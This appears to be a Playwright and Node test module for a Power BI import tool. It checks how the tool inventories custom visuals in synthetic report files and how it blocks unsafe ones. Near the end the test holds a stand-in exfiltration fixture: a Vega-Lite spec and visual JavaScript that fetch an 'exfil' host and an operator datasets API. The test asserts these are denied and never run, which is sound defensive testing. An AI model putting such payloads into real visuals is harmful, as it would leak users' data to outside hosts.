import assert from 'node:assert/strict'
import {dump} from 'js-yaml'
import {join} from 'node:path'

// Synthetic PBIR containers and unpacked metadata in the documented Power BI
// shapes. These fixtures convey no real publisher licence or binary rights.
const deneb='STANDALONEdeneb7E15AEF80B9E4D4F8E12924291ECE89A'
const licensed='synthetic-bifocal-licensed-visual',unknown='synthetic-bifocal-marketplace-visual'
const report='Sales.Report/',pagePath=report+'definition/pages/synthetic-bifocal-page/page.json'
const visualPath=name=>report+'definition/pages/synthetic-bifocal-page/visuals/'+name+'/visual.json'
const json=(path,value)=>({path,content:JSON.stringify(value)})
const literal=value=>({expr:{Literal:{Value:"'"+value.replace(/'/g,"''")+"'"}}})
const specification={data:{name:'dataset'},mark:{type:'bar'},encoding:{x:{field:'Region',type:'nominal'},y:{field:'RevenueSum',type:'quantitative'}}}
const roles={Values:{projections:[{field:{Column:{Expression:{SourceRef:{Entity:'Sales'}},Property:'Region'}},queryRef:'Sales.Region',nativeQueryRef:'Region'},{field:{Measure:{Expression:{SourceRef:{Entity:'Sales'}},Property:'RevenueSum'}},queryRef:'Sales.RevenueSum',nativeQueryRef:'RevenueSum'}]}}
const container=(name,type,spec)=>({name,position:{x:0,y:0,z:0,height:300,width:500,tabOrder:0},visual:{visualType:type,query:{queryState:roles},objects:{...(spec?{vega:[{properties:{jsonSpec:literal(JSON.stringify(spec)),jsonConfig:literal('{}')}}]}:{}),general:[{properties:{formatString:literal('$0.00')}}]},drillFilterOtherVisuals:true}})

export async function proveCustomVisualInventory({base,prepare,apply,call,page,origin,proveScreen}){
 const capture=async name=>{await proveScreen(name);if(process.env.BIFOCAL_PROOF_DIR)for(const width of [1440,390]){await page.setViewportSize({width,height:1000});await page.getByRole('region',{name:'Custom visual mappings',exact:true}).screenshot({path:join(process.env.BIFOCAL_PROOF_DIR,name+'-detail-'+width+'.png')})}}
 const input=structuredClone(base);input.projectId='synthetic-bifocal-custom-visuals'
 const metadataPath=type=>report+'CustomVisuals/'+type+'/resources/'+type+'.pbiviz.json'
 const manifestPath=type=>report+'CustomVisuals/'+type+'/package.json'
 const publisher='Synthetic visual publisher',version='1.2.3.4'
 const metadata=type=>({visual:{guid:type,displayName:type,version},author:{name:publisher,email:'synthetic-bifocal@example.test'},license:{name:'Synthetic commercial licence',requirements:['Publisher entitlement required','Binary redistribution prohibited']},capabilities:{privileges:[],dataRoles:[{name:'Values',displayName:'Values',kind:'GroupingOrMeasure'}],dataViewMappings:[{table:{rows:{for:{in:'Values'}}}}],objects:{general:{properties:{formatString:{type:{formatting:{formatString:true}}}}}},supportsHighlight:true,drilldown:{roles:['Values']}}})
 const interactions=[{source:'synthetic-bifocal-deneb',target:'synthetic-bifocal-licensed',type:'DataFilter'}]
 input.files.push(
  json(report+'definition/report.json',{publicCustomVisuals:[unknown],resourcePackages:[deneb,licensed].map(name=>({name,type:'CustomVisual',items:[{name:name+'.pbiviz.json',path:name+'.pbiviz.json',type:'CustomVisualMetadata'}]}))}),
  json(pagePath,{name:'synthetic-bifocal-page',displayName:'Synthetic custom visuals',visualInteractions:interactions}),
  json(visualPath('synthetic-bifocal-deneb'),container('synthetic-bifocal-deneb',deneb,specification)),
  json(visualPath('synthetic-bifocal-licensed'),{...container('synthetic-bifocal-licensed',licensed),visual:{...container('synthetic-bifocal-licensed',licensed).visual,drillFilterOtherVisuals:undefined}}),
  json(visualPath('synthetic-bifocal-marketplace'),container('synthetic-bifocal-marketplace',unknown)),
  ...[deneb,licensed].flatMap(type=>[json(manifestPath(type),{visual:{guid:type,name:type,version},author:{name:publisher,email:'synthetic-bifocal@example.test'}}),json(metadataPath(type),metadata(type))])
 )
 const plan=await prepare(input);assert.equal(plan.counts.rejected,0);assert.equal(plan.project.report.compatible,false)
 const resources=plan.project.report.project.resources,visuals=resources.filter(item=>item.kind==='pbip-custom-visual')
 assert.equal(visuals.length,3,'Every declared or unrecognized source visual remains inventoried')
 const source=visuals.find(item=>item.id===visualPath('synthetic-bifocal-deneb')),inventory=source.definition.inventory
 assert.equal(source.sourceExpression,input.files.find(item=>item.path===source.file).content)
 assert.deepEqual(source.definition.source,JSON.parse(source.sourceExpression),'Source visual is retained without rewriting')
 assert.ok(source.dependencies.includes(metadataPath(deneb)))
 assert.ok(resources.find(item=>item.id===pagePath).dependencies.includes(source.id))
 assert.ok(resources.find(item=>item.id===report+'definition.pbir').dependencies.includes(pagePath))
 assert.equal(inventory.publisher.status,'declared');assert.ok(inventory.publisher.declarations.some(item=>item.name===publisher&&item.file===metadataPath(deneb)))
 assert.equal(inventory.version.value,version);assert.deepEqual(inventory.dataRoles.bindings,roles)
 assert.deepEqual(inventory.dataRoles.declarations[0].roles,metadata(deneb).capabilities.dataRoles)
 assert.deepEqual(inventory.formatting.objects,source.definition.source.visual.objects)
 assert.deepEqual(inventory.interactions.page,interactions);assert.equal(inventory.interactions.visual.drillFilterOtherVisuals,true)
 assert.equal(inventory.licence.entitlement,'not-established');assert.deepEqual(inventory.licence.requirements[0].declaration,metadata(deneb).license)
 assert.equal(inventory.mapping.name,'native-declarative-chart');assert.equal(inventory.mapping.status,'requires-native-review')
 assert.deepEqual(inventory.mapping.specification,{language:'vega-lite',spec:specification})
 assert.deepEqual(inventory.mapping.affectedDependents,[source.file,pagePath,report+'definition.pbir'])
 const unsupported=visuals.find(item=>item.id===visualPath('synthetic-bifocal-licensed')).definition.inventory
 assert.equal(unsupported.mapping.status,'unsupported');assert.ok(unsupported.mapping.name.includes(licensed))
 const missing=visuals.find(item=>item.id===visualPath('synthetic-bifocal-marketplace')).definition.inventory
 assert.equal(missing.sourceKind,'appsource');assert.equal(missing.publisher.status,'unknown');assert.equal(missing.version.status,'unknown');assert.deepEqual(missing.licence.requirements,[])
 assert.ok(plan.project.report.issues.some(item=>item.code==='custom_visual_metadata_required'&&item.file===visualPath('synthetic-bifocal-marketplace')))
 await apply(input.projectId,plan)
 const imported=await call('/model-imports/'+input.projectId)
 assert.deepEqual(imported.report.project.resources,resources);assert.deepEqual(imported.input.files,input.files)
 await call('/model-imports/'+input.projectId+'/export',{reviewedRevision:imported.revision},409)
 await call('/model-authoring/review',{document:dump(imported.definition),importProject:input.projectId,importRevision:imported.revision},409)
 await page.goto(origin+'/app/import');await page.getByText('Import a semantic project',{exact:true}).click();await page.getByLabel('Project ID',{exact:true}).fill(input.projectId);await page.getByRole('button',{name:'Load imported project',exact:true}).click();await page.getByRole('status').filter({hasText:'Current project loaded'}).waitFor()
 assert.ok((await page.getByRole('table',{name:'Source project inventory'}).innerText()).includes(source.file))
 const mapping=page.getByRole('region',{name:'Custom visual mappings',exact:true});await mapping.waitFor();assert.ok((await mapping.innerText()).includes(publisher));assert.ok((await mapping.innerText()).includes(version));assert.ok((await mapping.innerText()).includes('native-declarative-chart'))
 const pageOnly=mapping.locator('details').filter({has:page.locator('summary').filter({hasText:'synthetic-bifocal-licensed-visual'})}).first()
 await pageOnly.locator('summary').click()
 const pageOnlyText=await pageOnly.innerText()
 assert.ok(pageOnlyText.includes('Page:')&&pageOnlyText.includes('DataFilter')&&pageOnlyText.includes('synthetic-bifocal-deneb')&&pageOnlyText.includes('synthetic-bifocal-licensed'),'Page-level interactions remain visible without visual-level declarations')
 assert.ok(!pageOnlyText.includes('No interaction declarations'))
 const combinedText=await mapping.locator('details').first().innerText()
 assert.ok(combinedText.includes('Visual:')&&combinedText.includes('Page:'),'Both interaction scopes are retained')
 await page.getByText('Full source compatibility report',{exact:true}).click()
 const visible=JSON.parse(await page.locator('#model-import-current pre').innerText())
 assert.deepEqual(visible.report.project.resources.find(item=>item.id===source.id).definition.inventory,inventory)
 assert.equal(await page.getByRole('link',{name:'Review imported model',exact:true}).count(),0);assert.equal(await page.getByRole('button',{name:'Export rebuilt model',exact:true}).count(),0)
 await capture('custom-visual-source-inventory')
 const unsafe=structuredClone(input);unsafe.projectId='synthetic-bifocal-custom-visuals-unsafe'
 const activeSpec={...specification,data:{url:'https://synthetic-bifocal-exfil.invalid/salary'},transform:[{calculate:"fetch('/api/operator/datasets')",as:'salary'}]}
 unsafe.files.find(item=>item.path===source.file).content=JSON.stringify(container('synthetic-bifocal-deneb',deneb,activeSpec))
 const active=metadata(deneb);active.content={js:"globalThis.__syntheticBifocalVisualExecuted=true;fetch('https://synthetic-bifocal-exfil.invalid/salary')"};active.capabilities.privileges=[{name:'WebAccess',essential:true,parameters:['https://synthetic-bifocal-exfil.invalid']}]
 unsafe.files.find(item=>item.path===metadataPath(deneb)).content=JSON.stringify(active)
 const blocked=await prepare(unsafe);assert.equal(blocked.project.report.compatible,false)
 for(const code of ['unsafe_custom_visual_specification','custom_visual_execution_denied','custom_visual_capabilities_denied'])assert.ok(blocked.project.report.issues.some(item=>item.code===code),code)
 const denied=blocked.project.report.project.resources.find(item=>item.id===source.id).definition.inventory
 assert.equal(denied.mapping.status,'denied');assert.equal(denied.execution.active,false);assert.equal(denied.execution.network,'denied')
 await apply(unsafe.projectId,blocked);const retained=await call('/model-imports/'+unsafe.projectId)
 assert.deepEqual(retained.input.files,unsafe.files);assert.deepEqual(retained.report.project.resources,blocked.project.report.project.resources)
 await call('/model-imports/'+unsafe.projectId+'/export',{reviewedRevision:retained.revision},409)
 await call('/model-authoring/review',{document:dump(retained.definition),importProject:unsafe.projectId,importRevision:retained.revision},409)
 await page.goto(origin+'/app/import');await page.getByText('Import a semantic project',{exact:true}).click();await page.getByLabel('Project ID',{exact:true}).fill(unsafe.projectId);await page.getByRole('button',{name:'Load imported project',exact:true}).click();await page.getByRole('status').filter({hasText:'Current project loaded'}).waitFor();await page.getByText('Full source compatibility report',{exact:true}).click()
 const unsafeVisible=JSON.parse(await page.locator('#model-import-current pre').innerText())
 assert.deepEqual(unsafeVisible.report.project.resources,retained.report.project.resources)
 assert.equal(await page.evaluate(()=>globalThis.__syntheticBifocalVisualExecuted),undefined,'Reviewing imported metadata never evaluates its JavaScript')
 await capture('custom-visual-denied-inventory')
 return [{input,plan},{input:unsafe,plan:blocked}]
}
